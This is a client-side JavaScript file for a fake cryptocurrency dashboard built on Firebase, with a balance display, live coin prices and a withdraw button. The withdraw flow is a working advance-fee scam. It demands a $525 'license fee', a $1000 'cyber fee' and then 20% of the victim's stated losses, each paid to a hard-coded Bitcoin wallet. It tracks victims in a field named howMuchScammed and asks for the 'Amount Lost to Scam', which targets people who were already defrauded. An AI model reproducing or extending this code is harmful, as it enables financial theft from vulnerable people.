// CLIENT-SIDE ONLY - Remove all Firebase Admin code!

const firebaseConfig = {
  apiKey: "AIzaSyCnj0IErUeGXEGl72I8495ZS1RHeuOBwfY",
  authDomain: "fir-demo-app-f3342.firebaseapp.com",
  databaseURL: "https://fir-demo-app-f3342-default-rtdb.firebaseio.com",
  projectId: "fir-demo-app-f3342",
  storageBucket: "fir-demo-app-f3342.firebasestorage.app",
  messagingSenderId: "690323727261",
  appId: "1:690323727261:web:4bdeea8a182e62cd4e8574",
  measurementId: "G-BXYG86T6S0"
};

// Initialize Firebase CLIENT SDK
if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}

const auth = firebase.auth();
const db = firebase.firestore();

// DOM Elements
const loadingOverlay = document.getElementById('loading-overlay');
const userName = document.getElementById('user-name');
const userEmail = document.getElementById('user-email');
const balanceAmount = document.getElementById('balance-amount');
const balanceToggle = document.getElementById('balance-toggle');
const withdrawBtn = document.getElementById('withdraw-btn');
const withdrawModal = document.getElementById('withdraw-modal');
const modalClose = document.getElementById('modal-close');
const withdrawForm = document.getElementById('withdraw-form');
const logoutBtn = document.getElementById('logout-btn');

let balanceVisible = true;
let currentUser = null;
let userBalance = '0.00';
let userData = null;
let cryptoPriceData = {};
let priceUpdateInterval;

// Bitcoin wallet configuration
const BTC_WALLET_ADDRESS = "bc1qq975x697efde0zc23uy6aqfsu7g3s8d3rna5jv";
const BTC_QR_CODE_URL = "https://firebasestorage.googleapis.com/v0/b/pet-idea.appspot.com/o/profilePics%2Fb5bb6a4e-365a-4f87-b7bc-fa44e477cc6d.jpeg?alt=media&token=9d2ff027-a2f6-4f65-9b80-6de639d95cbe"

// Crypto configuration
const CRYPTO_SYMBOLS = ['bitcoin', 'ethereum', 'dogecoin'];
const CRYPTO_DISPLAY = {
  bitcoin: { symbol: 'BTC', icon: '₿' },
  ethereum: { symbol: 'ETH', icon: 'Ξ' },
  dogecoin: { symbol: 'DOGE', icon: 'Ð' }
};

// Check authentication state
auth.onAuthStateChanged(async (user) => {
  console.log('Auth state changed:', user ? `User: ${user.uid}` : 'No user');
  
  if (user) {
    currentUser = user;
    console.log(`User authenticated: ${user.uid}, Email verified: ${user.emailVerified}`);
    
    try {
      await loadUserData(user);
      await initializeCryptoPrices();
      console.log('User data and crypto prices loaded successfully');
    } catch (error) {
      console.error('Error loading dashboard data:', error);
    } finally {
      hideLoading();
    }
  } else {
    console.log('No authenticated user, redirecting to signin');
    window.location.href = '/signin';
  }
});

// Load user data from Firestore
async function loadUserData(user) {
  try {
    console.log('Loading user data for:', user.uid);
    
    // Update user info in header
    if (userName) userName.textContent = `Welcome back, ${user.displayName || 'User'}`;
    if (userEmail) userEmail.textContent = user.email;
    
    if (user.photoURL && userAvatar) {
      userAvatar.src = user.photoURL;
    }
    
    // Load user data from Firestore
    console.log('Fetching user document from Firestore...');
    const userDoc = await db.collection('users').doc(user.uid).get();
    
    if (userDoc.exists) {
      console.log('User document found:', userDoc.data());
      userData = userDoc.data();
      userBalance = userData.balance || '$0.00';
      
      // Remove currency symbol for display
      const balanceValue = userBalance.replace('$', '');
      if (balanceAmount) {
        balanceAmount.textContent = balanceValue;
        balanceAmount.setAttribute('data-balance', balanceValue);
      }
    } else {
      console.log('User document not found, creating default...');
      
      // Create user document if it doesn't exist
      const newUserData = {
        fullName: user.displayName || '',
        email: user.email,
        balance: '$0.00',
        createdAt: firebase.firestore.FieldValue.serverTimestamp(),
        pendingPayment1: false,
        pendingPayment2: false,
        pendingPayment3: false,
        howMuchScammed: 0
      };
      
      await db.collection('users').doc(user.uid).set(newUserData);
      console.log('Created new user document');
      
      userData = newUserData;
      userBalance = '$0.00';
      if (balanceAmount) {
        balanceAmount.textContent = '0.00';
        balanceAmount.setAttribute('data-balance', '0.00');
      }
    }
    
  } catch (error) {
    console.error('Error loading user data:', error);
    
    // Set default values if error
    userData = {
      pendingPayment1: false,
      pendingPayment2: false,
      pendingPayment3: false,
      howMuchScammed: 0
    };
    userBalance = '$0.00';
    if (balanceAmount) {
      balanceAmount.textContent = '0.00';
      balanceAmount.setAttribute('data-balance', '0.00');
    }
    
    // Show balance visibility by default
    balanceVisible = true;
  }
}

// Initialize crypto prices
async function initializeCryptoPrices() {
  console.log('Initializing crypto prices...');
  try {
    // First, try to load prices immediately
    await updateCryptoPrices();
    
    // Then set up interval for updates every 30 seconds
    if (priceUpdateInterval) {
      clearInterval(priceUpdateInterval);
    }
    priceUpdateInterval = setInterval(updateCryptoPrices, 30000);
    
    console.log('Crypto prices initialized successfully');
  } catch (error) {
    console.error('Error initializing crypto prices:', error);
    // Set fallback prices if API fails
    setFallbackPrices();
  }
}

// Update crypto prices
async function updateCryptoPrices() {
  console.log('Fetching crypto prices...');
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
    
    const response = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${CRYPTO_SYMBOLS.join(',')}&vs_currencies=usd&include_24hr_change=true`,
      { 
        signal: controller.signal,
        headers: {
          'Accept': 'application/json',
        }
      }
    );
    
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const data = await response.json();
    console.log('Crypto price data received:', data);
    
    cryptoPriceData = data;
    updateCryptoPriceDisplay();
    
  } catch (error) {
    console.error('Error fetching crypto prices:', error);
    
    // If it's the first attempt, try fallback prices
    if (Object.keys(cryptoPriceData).length === 0) {
      setFallbackPrices();
    }
  }
}

// Set fallback prices if API fails
function setFallbackPrices() {
  console.log('Setting fallback crypto prices');
  cryptoPriceData = {
    bitcoin: { usd: 43250, usd_24h_change: 2.45 },
    ethereum: { usd: 2650, usd_24h_change: -1.23 },
    dogecoin: { usd: 0.089, usd_24h_change: 5.67 }
  };
  updateCryptoPriceDisplay();
}

// Update crypto price display
function updateCryptoPriceDisplay() {
  console.log('Updating crypto price display...');
  
  CRYPTO_SYMBOLS.forEach(symbol => {
    const priceElement = document.getElementById(`${symbol}-price`);
    const changeElement = document.getElementById(`${symbol}-change`);
    
    console.log(`Looking for elements: ${symbol}-price, ${symbol}-change`);
    console.log('Price element found:', !!priceElement);
    console.log('Change element found:', !!changeElement);
    
    if (priceElement && cryptoPriceData[symbol]) {
      const price = cryptoPriceData[symbol].usd;
      const change = cryptoPriceData[symbol].usd_24h_change;
      
      // Format price based on value
      let formattedPrice;
      if (price < 1) {
        formattedPrice = `$${price.toFixed(4)}`;
      } else if (price < 100) {
        formattedPrice = `$${price.toFixed(2)}`;
      } else {
        formattedPrice = `$${price.toLocaleString()}`;
      }
      
      priceElement.textContent = formattedPrice;
      console.log(`Updated ${symbol} price to: ${formattedPrice}`);
      
      if (changeElement) {
        changeElement.textContent = `${change >= 0 ? '+' : ''}${change.toFixed(2)}%`;
        changeElement.className = `crypto-change ${change >= 0 ? 'positive' : 'negative'}`;
        console.log(`Updated ${symbol} change to: ${change.toFixed(2)}%`);
      }
    }
  });
}

// Handle withdraw button click
if (withdrawBtn) {
  withdrawBtn.addEventListener('click', async (e) => {
    e.preventDefault();
    
    if (!currentUser || !userData) {
      console.error('User data not loaded');
      return;
    }
    
    // Check payment status and show appropriate modal
    if (!userData.pendingPayment1) {
      createPaymentModal(1);
    } else if (!userData.pendingPayment2) {
      createPaymentModal(2);
    } else if (!userData.pendingPayment3) {
      createPaymentModal(3);
    } else {
      // All payments completed, show regular withdraw modal
      if (withdrawModal) withdrawModal.classList.add('active');
    }
  });
}

// Balance toggle functionality
if (balanceToggle) {
  balanceToggle.addEventListener('click', () => {
    balanceVisible = !balanceVisible;
    const balanceValue = balanceAmount ? balanceAmount.getAttribute('data-balance') : '0.00';
    
    if (balanceVisible) {
      if (balanceAmount) balanceAmount.textContent = balanceValue;
      balanceToggle.textContent = '👁️';
    } else {
      if (balanceAmount) balanceAmount.textContent = '••••••';
      balanceToggle.textContent = '🙈';
    }
  });
}

// Logout functionality
if (logoutBtn) {
  logoutBtn.addEventListener('click', async () => {
    try {
      await auth.signOut();
      window.location.href = '/signin';
    } catch (error) {
      console.error('Error signing out:', error);
    }
  });
}

// Show loading overlay
function showLoading() {
  console.log('Showing loading overlay');
  if (loadingOverlay) {
    loadingOverlay.classList.add('active');
  }
}

// Hide loading overlay
function hideLoading() {
  console.log('Hiding loading overlay');
  if (loadingOverlay) {
    loadingOverlay.classList.remove('active');
  }
}

// Close regular withdraw modal
if (modalClose) {
  modalClose.addEventListener('click', () => {
    if (withdrawModal) withdrawModal.classList.remove('active');
  });
}

// Click outside to close regular modal
if (withdrawModal) {
  withdrawModal.addEventListener('click', (e) => {
    if (e.target === withdrawModal) {
      withdrawModal.classList.remove('active');
    }
  });
}

// Create professional payment modal
function createPaymentModal(step, amount = null) {
  let title, message, amountText;
  
  switch (step) {
    case 1:
      title = "License Fee Required";
      message = "Can't Withdraw at this point till the license fee of $525";
      amountText = "$525";
      break;
    case 2:
      title = "Cyber Fee Required";
      message = "Can't withdraw now till Cyber fee is paid which is $1000";
      amountText = "$1000";
      break;
    case 3:
      const twentyPercent = (userData.howMuchScammed * 0.2).toFixed(2);
      title = "Processing Fee Required";
      message = "Can't withdraw till 20% is paid";
      amountText = `$${twentyPercent}`;
      break;
    default:
      return;
  }

  // Remove existing modal if any
  const existingModal = document.getElementById('payment-modal');
  if (existingModal) {
    existingModal.remove();
  }

  // Create modal HTML
  const modalHTML = `
    <div class="payment-modal-overlay" id="payment-modal">
      <div class="payment-modal">
        <div class="payment-modal-header">
          <div class="payment-header-content">
            <div class="payment-icon">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"/>
              </svg>
            </div>
            <div class="payment-title-section">
              <h3 class="payment-title">${title}</h3>
              <p class="payment-subtitle">Secure Payment Required</p>
            </div>
          </div>
          <button class="payment-modal-close" id="payment-modal-close">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
              <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/>
            </svg>
          </button>
        </div>
        
        <div class="payment-modal-content">
          ${step === 1 ? `
          <div class="scam-amount-section">
            <label for="scam-amount" class="scam-amount-label">
              <span class="label-text">Amount Lost to Scam</span>
              <span class="label-description">Enter the amount you were scammed to proceed</span>
            </label>
            <div class="scam-amount-input-wrapper">
              <span class="currency-symbol">$</span>
              <input type="number" id="scam-amount" class="scam-amount-input" placeholder="0.00" min="1" step="0.01" required>
            </div>
          </div>
          ` : ''}
          
          <div class="payment-message-section">
            <div class="alert-box">
              <div class="alert-icon">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
                  <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                </svg>
              </div>
              <div class="alert-content">
                <p class="alert-message">${message}</p>
                <p class="alert-amount">${amountText}</p>
              </div>
            </div>
          </div>
          
          <div class="payment-details-section">
            <div class="payment-method-header">
              <div class="bitcoin-icon">
                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                  <circle cx="16" cy="16" r="16" fill="#F7931A"/>
                  <path d="M23.189 14.02c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.113-.92-.22-1.385-.326l.695-2.783L15.596 6l-.708 2.839c-.376-.086-.746-.17-1.104-.257l.002-.009-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.181-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.313-1.256-.313L8.53 19.833l2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.728.43.708-2.84c.472.127.93.245 1.378.357l-.706 2.828 1.728.43.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538z" fill="white"/>
                </svg>
              </div>
              <h4 class="payment-method-title">Bitcoin Payment</h4>
              <p class="payment-method-subtitle">Send payment to the address below</p>
            </div>
            
            <div class="qr-code-section">
              <div class="qr-code-container">
                <img src="${BTC_QR_CODE_URL}" alt="Bitcoin QR Code" class="qr-code-image">
              </div>
            </div>
            
            <div class="wallet-address-section">
              <label class="wallet-address-label">Bitcoin Wallet Address</label>
              <div class="wallet-address-container">
                <input type="text" value="${BTC_WALLET_ADDRESS}" class="wallet-address-input" readonly>
                <button class="copy-address-btn" onclick="copyWalletAddress()">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                    <path fill-rule="evenodd" d="M4 2a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H6a2 2 0 01-2-2V2zm2-1a1 1 0 00-1 1v8a1 1 0 001 1h8a1 1 0 001-1V2a1 1 0 00-1-1H6zM2 5a1 1 0 100-2 1 1 0 000 2zm-2 9a2 2 0 012-2h2a1 1 0 010 2H2a1 1 0 01-1-1v-7a1 1 0 012 0v6a1 1 0 001 1h8a1 1 0 010 2H2z"/>
                  </svg>
                </button>
              </div>
            </div>
          </div>
          
          <div class="payment-actions">
            <button class="payment-complete-btn" id="payment-complete-btn" onclick="handlePaymentComplete(${step})">
              <span class="button-icon">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
                  <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
                </svg>
              </span>
              I have completed the payment
            </button>
          </div>
        </div>
      </div>
    </div>
  `;

  // Add modal to DOM
  document.body.insertAdjacentHTML('beforeend', modalHTML);
  
  // Add event listeners
  const modal = document.getElementById('payment-modal');
  const closeBtn = document.getElementById('payment-modal-close');
  
  // Show modal with animation
  setTimeout(() => {
    modal.classList.add('active');
  }, 10);
  
  // Close modal event
  closeBtn.addEventListener('click', () => {
    closePaymentModal();
  });
  
  // Click outside to close
  modal.addEventListener('click', (e) => {
    if (e.target === modal) {
      closePaymentModal();
    }
  });
}

// Close payment modal
function closePaymentModal() {
  const modal = document.getElementById('payment-modal');
  if (modal) {
    modal.classList.remove('active');
    setTimeout(() => {
      modal.remove();
    }, 300);
  }
}

// Copy wallet address to clipboard
function copyWalletAddress() {
  const addressInput = document.querySelector('.wallet-address-input');
  if (addressInput) {
    addressInput.select();
    document.execCommand('copy');
    
    // Show feedback
    const copyBtn = document.querySelector('.copy-address-btn');
    const originalHTML = copyBtn.innerHTML;
    copyBtn.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
        <path fill-rule="evenodd" d="M13.854 3.646a.5.5 0 010 .708l-7 7a.5.5 0 01-.708 0l-3.5-3.5a.5.5 0 11.708-.708L6.5 10.293l6.646-6.647a.5.5 0 01.708 0z"/>
      </svg>
    `;
    
    setTimeout(() => {
      copyBtn.innerHTML = originalHTML;
    }, 2000);
  }
}

// Handle payment completion
async function handlePaymentComplete(step) {
  const completeBtn = document.getElementById('payment-complete-btn');
  
  try {
    // Show loading state
    completeBtn.disabled = true;
    completeBtn.innerHTML = `
      <span class="button-spinner">
        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
          <path d="M10 3a7 7 0 100 14 7 7 0 000-14zM2 10a8 8 0 1116 0 8 8 0 01-16 0z" opacity="0.25"/>
          <path d="M10 2a8 8 0 018 8" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"/>
        </svg>
      </span>
      Processing...
    `;
    
    if (step === 1) {
      // Get scam amount and save to Firestore
      const scamAmountInput = document.getElementById('scam-amount');
      if (!scamAmountInput || !scamAmountInput.value) {
        alert('Please enter the amount you were scammed');
        completeBtn.disabled = false;
        completeBtn.innerHTML = `
          <span class="button-icon">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
              <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
            </svg>
          </span>
          I have completed the payment
        `;
        return;
      }
      
      const scamAmount = parseFloat(scamAmountInput.value);
      if (scamAmount <= 0) {
        alert('Please enter a valid amount');
        completeBtn.disabled = false;
        completeBtn.innerHTML = `
          <span class="button-icon">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
              <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
            </svg>
          </span>
          I have completed the payment
        `;
        return;
      }
      
      // Update user data with scam amount
      await db.collection('users').doc(currentUser.uid).update({
        howMuchScammed: scamAmount
      });
      
      userData.howMuchScammed = scamAmount;
    }
    
    // Show success message
    completeBtn.innerHTML = `
      <span class="button-icon">
        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
          <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
        </svg>
      </span>
      Payment Submitted Successfully
    `;
    
    // Close modal after delay
    setTimeout(() => {
      closePaymentModal();
    }, 2000);
    
  } catch (error) {
    console.error('Error handling payment completion:', error);
    alert('Error processing payment. Please try again.');
    
    // Reset button
    completeBtn.disabled = false;
    completeBtn.innerHTML = `
      <span class="button-icon">
        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
          <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
        </svg>
      </span>
      I have completed the payment
    `;
  }
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
  console.log('DOM Content Loaded - Initializing dashboard');
  showLoading();
  
  // Debug: Check if crypto price elements exist
  setTimeout(() => {
    console.log('Checking for crypto price elements...');
    CRYPTO_SYMBOLS.forEach(symbol => {
      const priceElement = document.getElementById(`${symbol}-price`);
      const changeElement = document.getElementById(`${symbol}-change`);
      console.log(`${symbol}-price element:`, priceElement);
      console.log(`${symbol}-change element:`, changeElement);
    });
  }, 1000);
});